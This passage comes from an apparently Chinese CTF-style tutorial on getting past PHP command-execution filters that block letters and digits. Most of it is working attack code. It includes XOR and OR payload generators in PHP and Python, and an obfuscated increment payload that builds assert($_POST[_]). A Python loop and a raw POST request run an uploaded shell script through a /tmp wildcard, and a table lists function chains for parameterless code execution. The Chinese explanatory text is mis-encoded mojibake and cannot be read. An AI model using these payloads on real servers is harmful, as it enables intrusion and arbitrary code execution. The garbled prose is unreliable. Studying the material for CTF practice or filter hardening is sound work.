function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p><a href="http://xor.py">xor.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h5 id="æˆ–ç»•è¿‡">æˆ–ç»•è¿‡</h5><p>é€šè¿‡ä¸å¯è§å­—ç¬¦ä¹‹é—´çš„æˆ–è¿ç®—æ„é€ å‡ºä»»æ„æ¶æ„å‘½ä»¤ï¼Œå°†ä¸¤ä¸ªè„šæœ¬æŒ‰ç…§è§„å®šå‘½åæ”¾åˆ°åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ¯æ¬¡ä½¿ç”¨æ—¶éœ€è¦æ ¹æ®é¢˜ç›®ä»£ç æ›´æ¢phpè„šæœ¬ä¸­çš„æ­£åˆ™éƒ¨åˆ†ï¼Œæ›´æ”¹å¥½è¿è¡Œpythonä»£ç ï¼Œæ ¹æ®æç¤ºæ„é€ å³å¯</p><p>or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p><a href="http://or.py">or.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment"># æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h5 id="è‡ªå¢ç»•è¿‡">è‡ªå¢ç»•è¿‡</h5><p>é€šè¿‡phpçš„è‡ªå¢ç‰¹æ€§ï¼Œæ„é€ å‡ºæ¶æ„å­—ç¬¦ä¸²assert($_POST[_]);ï¼Œè¿›è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œ</p><p>ä½•ä¸ºè‡ªå¢ï¼Ÿ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123195735901.png" alt="image-20240123195735901"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒAåœ¨è¿›è¡Œ++æ“ä½œä¹‹åå˜æˆäº†Bï¼Œè§„å¾‹éµå¾ªasciiç è¡¨ï¼Œè¯¦è§å¼€å¤´ã€‚ä»¥ä¸‹ä¸ºæ„é€ è„šæœ¬</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>æµ‹è¯•å‘ç°<span class="number">7.0</span>.<span class="number">12</span>ä»¥ä¸Šç‰ˆæœ¬ä¸å¯ä½¿ç”¨</span><br><span class="line"><span class="regexp">//</span>ä½¿ç”¨æ—¶éœ€è¦urlç¼–ç ä¸‹</span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;$_&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">å›ºå®šæ ¼å¼ æ„é€ å‡ºæ¥çš„ assert(<span class="variable">$_POST</span>[_]);</span><br><span class="line">ç„¶åpostä¼ å…¥   _=phpinfo();</span><br></pre></td></tr></table></figure><h5 id="ä¸´æ—¶æ–‡ä»¶æ‰§è¡Œ">ä¸´æ—¶æ–‡ä»¶æ‰§è¡Œ</h5><p>æ­¤æ–¹æ³•çš„é€‚ç”¨ç¯å¢ƒç¨æœ‰ä¸åŒï¼Œä»¥ä¸Šæ‰‹æ³•çš†ä¸ºevalç±»çš„æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œï¼Œè€Œæ­¤æ–¹æ³•é€‚ç”¨äºsystemç±»å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://url/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, b<span class="string">&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        print(r.<span class="built_in">text</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚ç”±äºå­—æ¯æ•°å­—è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æ‰€æœ‰çš„å­—æ¯æ•°å­—éƒ½ç”¨?é€šé…ç¬¦ä»£æ›¿</p><p><strong>å…³äºæ­£åˆ™éƒ¨åˆ†</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>[@-[]</span><br></pre></td></tr></table></figure><p>æ ¹æ®è§‚å¯Ÿï¼Œæ–‡ä»¶çš„æœ€åä¸€ä½å¿…å®šä¸ºå¤§å†™å­—æ¯ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ­£åˆ™å¼ºåˆ¶åŒ¹é…å¤§å†™å­—ç¬¦å¢åŠ æˆåŠŸå‡ ç‡ï¼Œè¯¦è§å¼€å¤´asciiç è¡¨</p><p><strong>å…³äº.</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. filename</span><br></pre></td></tr></table></figure><p>ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚å½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™. fileçš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfilenameæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç”¨.æ¥æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶</p><p>å‚è€ƒè¯·æ±‚åŒ…</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?shell<span class="operator">=</span>?&gt;&lt;?<span class="operator">=</span>`.+/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f[<span class="variable">%40</span>-[]`<span class="variable">%3</span>b?&gt; HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">43.210</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span><span class="comment">; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span></span><br><span class="line">Accept: text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml<span class="comment">;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line">Accept-Language: zh-CN<span class="punctuation">,</span>zh<span class="comment">;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line">Content-Type:multipart/form-data<span class="comment">;boundary=--------123</span></span><br><span class="line">Accept-Encoding: gzip<span class="punctuation">,</span> deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Length: <span class="number">109</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-123</span></span><br><span class="line">Content-Disposition:form-data<span class="comment">;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br><span class="line">---------<span class="number">-123</span>--</span><br></pre></td></tr></table></figure><h4 id="æœ‰æˆ–æ— å‚æ•°rce">æœ‰æˆ–æ— å‚æ•°rce</h4><p>æ‰€è°“æ— å‚æ•°rceå°±æ˜¯åˆ©ç”¨å„ç§å·²å®šä¹‰å‡½æ•°çš„å¤æ‚æ­é…ï¼Œåœ¨evalå‘½ä»¤æ‰§è¡Œçš„æ¡ä»¶ä¸‹æˆåŠŸæ„é€ æˆ‘ä»¬æ‰€éœ€çš„æ¶æ„ä»£ç çš„æ“ä½œã€‚ä¾‹å¦‚ä¸‹æ–¹ç®€ä»‹è¡¨æ ¼ä¸­çš„æœ€åä¸€æ¡ä»£ç ä¸²ã€‚</p><p>ç¤ºä¾‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å¸¸è§å‡½æ•°åŠç®€ä»‹">å¸¸è§å‡½æ•°åŠç®€ä»‹</h5><table><thead><tr><th>å‡½æ•°</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>include()</td><td>åŒ…å«æ–‡ä»¶å†…å®¹</td></tr><tr><td>require()</td><td>åŒ…å«æ–‡ä»¶å†…å®¹</td></tr><tr><td>include_once()</td><td>åŒ…å«æ–‡ä»¶å†…å®¹</td></tr><tr><td>require_once()</td><td>åŒ…å«æ–‡ä»¶å†…å®¹</td></tr><tr><td>foreach($a as $x =&gt; $y)</td><td>$aä¸ºæ•°ç»„,å°†æ•°ç»„åå’Œå€¼å¾ªç¯èµ‹å€¼ç»™$xå’Œ$y</td></tr><tr><td>exit($a)</td><td>è¾“å‡º$aå¹¶é€€å‡ºå½“å‰è„šæœ¬</td></tr><tr><td>show_source()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>file_get_contents()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>highlight_file()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>readfile()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>var_dump()</td><td>æ‰“å°æ•°ç»„ï¼Œæ˜¾ç¤ºæ–‡ä»¶å</td></tr><tr><td>printf()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>next()</td><td>æ•°ç»„æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä½</td></tr><tr><td>array_reverse()</td><td>æ•°ç»„ä½ç½®å‰åè°ƒè½¬</td></tr><tr><td>show_source(next(array_reverse(scandir(current(localeconv())))))</td><td>è¾“å‡ºå½“å‰ç›®å½•å€’æ•°ç¬¬äºŒä¸ªæ–‡ä»¶å†…å®¹</td></tr><tr><td>localeconv()</td><td>è¯¦ç»†çš„è‡ªå·±æœï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„ç¬¬ä¸€ä¸ªæ˜¯å°æ•°ç‚¹å­—ç¬¦ï¼Œå› æ­¤å¯ä»¥ç”¨current()æå–ä¸€ä¸ª.</td></tr><tr><td>current()æˆ–pos()</td><td>æå–æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ 